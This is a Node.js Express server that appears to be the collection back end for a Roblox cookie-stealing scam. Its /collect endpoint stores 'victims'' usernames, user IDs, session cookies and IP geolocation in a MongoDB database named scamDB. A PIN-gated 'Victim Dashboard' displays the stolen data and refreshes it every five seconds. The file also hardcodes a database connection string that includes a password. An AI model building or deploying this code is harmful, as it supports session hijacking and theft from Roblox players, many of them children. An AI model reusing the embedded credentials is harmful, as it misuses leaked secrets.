const express = require('express');
const mongoose = require('mongoose');
const app = express();

const PORT = process.env.PORT || 3000;
const MONGO_URI = 'mongodb+srv://lam279887_db_user:HkeGLjjzQgMOGpux@malsca.vvj7hgz.mongodb.net/scamDB?retryWrites=true&w=majority';
const PASSCODE = '9799';
const DASHBOARD_TOKEN = 'inner9799';   // simple token to protect /dashboard

mongoose.connect(MONGO_URI)
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB error:', err));

const victimSchema = new mongoose.Schema({
  username: String,
  userId: Number,
  cookies: String,
  ipInfo: Object,
  timestamp: Number,
  receivedAt: { type: Date, default: Date.now }
});
const Victim = mongoose.model('Victim', victimSchema);

app.use(express.json());

// Endpoint for the Roblox script
app.post('/collect', async (req, res) => {
  try {
    const entry = new Victim(req.body);
    await entry.save();
    console.log('New entry:', entry.username);
    res.sendStatus(200);
  } catch (err) {
    console.error(err);
    res.sendStatus(500);
  }
});

// API for the dashboard
app.get('/api/victims', async (req, res) => {
  try {
    const victims = await Victim.find({}).sort({ receivedAt: -1 }).lean();
    res.json(victims);
  } catch (err) {
    res.json([]);
  }
});

// ---- Login page with 4-digit PIN ----
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Chrome Scripts – Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:radial-gradient(circle at top, #1a1a2e, #0a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:'Segoe UI',sans-serif; }
    .pin-box { background:rgba(20,20,30,0.95); padding:3rem 2rem; border-radius:24px; box-shadow:0 0 60px rgba(0,255,200,0.3); text-align:center; }
    h1 { color:#0ff; margin-bottom:5px; }
    p { color:#aaa; margin-bottom:25px; }
    .pin-inputs { display:flex; justify-content:center; gap:12px; }
    .pin-inputs input { width:60px; height:70px; text-align:center; font-size:32px; background:#222; border:2px solid #333; border-radius:12px; color:#fff; outline:none; font-weight:bold; }
    .pin-inputs input:focus { border-color:#0ff; box-shadow:0 0 12px #0ff; }
    button { margin-top:25px; padding:14px 40px; background:linear-gradient(135deg,#0f0,#0ff); border:none; border-radius:10px; font-size:18px; font-weight:bold; cursor:pointer; color:#000; transition:0.3s; }
    button:hover { opacity:0.8; }
    .error { color:red; margin-top:15px; display:none; }
  </style>
</head>
<body>
  <div class="pin-box">
    <h1>🔐 Chrome Scripts</h1>
    <p>Enter 4‑digit PIN</p>
    <div class="pin-inputs">
      <input type="text" maxlength="1" id="d1" oninput="autoTab(this,'d2')">
      <input type="text" maxlength="1" id="d2" oninput="autoTab(this,'d3')">
      <input type="text" maxlength="1" id="d3" oninput="autoTab(this,'d4')">
      <input type="text" maxlength="1" id="d4" oninput="checkPin()">
    </div>
    <button onclick="submitPin()">Enter</button>
    <div class="error" id="error">Wrong PIN!</div>
  </div>
  <script>
    function autoTab(current, nextId) { if (current.value.length === 1) document.getElementById(nextId)?.focus(); }
    function getPin() { return document.getElementById('d1').value + document.getElementById('d2').value + document.getElementById('d3').value + document.getElementById('d4').value; }
    function checkPin() { if (getPin().length === 4) submitPin(); }
    function submitPin() {
      if (getPin() === '${PASSCODE}') window.location.href = '/dashboard?token=${DASHBOARD_TOKEN}';
      else {
        document.getElementById('error').style.display = 'block';
        ['d1','d2','d3','d4'].forEach(id => document.getElementById(id).value = '');
        document.getElementById('d1').focus();
      }
    }
    window.onload = () => document.getElementById('d1').focus();
  </script>
</body>
</html>
  `);
});

// ---- Dashboard page ----
app.get('/dashboard', (req, res) => {
  if (req.query.token !== DASHBOARD_TOKEN) return res.redirect('/');
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Chrome Scripts – Victim Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; color:#fff; font-family:'Segoe UI',sans-serif; }
    .topbar { background:#111; padding:20px 25px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; box-shadow:0 0 20px rgba(0,255,200,0.2); }
    .topbar h1 { color:#0ff; font-size:1.8rem; }
    .topbar span { color:#aaa; }
    .logout-btn { background:#f33; color:#fff; border:none; padding:10px 20px; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s; }
    .logout-btn:hover { opacity:0.8; }
    .container { padding:30px; max-width:1400px; margin:0 auto; }
    .cards { display:flex; flex-wrap:wrap; gap:25px; justify-content:center; }
    .card { background:#151522; border:1px solid #2a2a3a; border-radius:20px; padding:25px; width:100%; max-width:350px; box-shadow:0 0 20px rgba(0,255,200,0.06); transition:0.3s; }
    .card:hover { box-shadow:0 0 30px rgba(0,255,200,0.2); transform:translateY(-3px); }
    .card-header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #2a2a3a; padding-bottom:12px; margin-bottom:15px; }
    .card-header h3 { color:#0ff; font-size:1.2rem; }
    .card-header small { color:#888; }
    .detail { display:flex; justify-content:space-between; padding:9px 0; border-bottom:1px solid #222; }
    .detail span:first-child { color:#888; font-weight:500; }
    .detail span:last-child { color:#ddd; text-align:right; word-break:break-all; max-width:60%; }
    .cookie { color:#0f0; }
    .ip { color:#ffaa00; }
    .empty { color:#888; text-align:center; padding:60px; }
  </style>
</head>
<body>
  <div class="topbar">
    <div>
      <h1>Chrome Scripts – Victim Dashboard</h1>
      <span>All captured data</span>
    </div>
    <button class="logout-btn" onclick="window.location.href='/'">Logout</button>
  </div>
  <div class="container">
    <div class="cards" id="cardsContainer">
      <div class="empty">Loading data...</div>
    </div>
  </div>
  <script>
    async function loadData() {
      try {
        const res = await fetch('/api/victims');
        const victims = await res.json();
        const container = document.getElementById('cardsContainer');
        if (!victims.length) {
          container.innerHTML = '<div class="empty">No victims yet.</div>';
          return;
        }
        container.innerHTML = victims.map(v => {
          const ip = v.ipInfo?.ip || 'N/A';
          const city = v.ipInfo?.city || '?';
          const country = v.ipInfo?.country || '?';
          const isp = v.ipInfo?.isp || '?';
          const cookies = v.cookies || 'no cookie';
          const ts = v.timestamp ? new Date(v.timestamp * 1000).toLocaleString() : 'N/A';
          return \`
            <div class="card">
              <div class="card-header">
                <h3>\${v.username || 'N/A'}</h3>
                <small>ID: \${v.userId || 'N/A'}</small>
              </div>
              <div class="detail">
                <span>Cookie</span>
                <span class="cookie">\${cookies.substring(0, 35)}...</span>
              </div>
              <div class="detail">
                <span>IP Address</span>
                <span class="ip">\${ip}</span>
              </div>
              <div class="detail">
                <span>Location</span>
                <span>\${city}, \${country}</span>
              </div>
              <div class="detail">
                <span>ISP</span>
                <span>\${isp}</span>
              </div>
              <div class="detail">
                <span>Captured</span>
                <span>\${ts}</span>
              </div>
            </div>
          \`;
        }).join('');
      } catch(e) { console.error(e); }
    }
    loadData();
    setInterval(loadData, 5000);
  </script>
</body>
</html>
  `);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
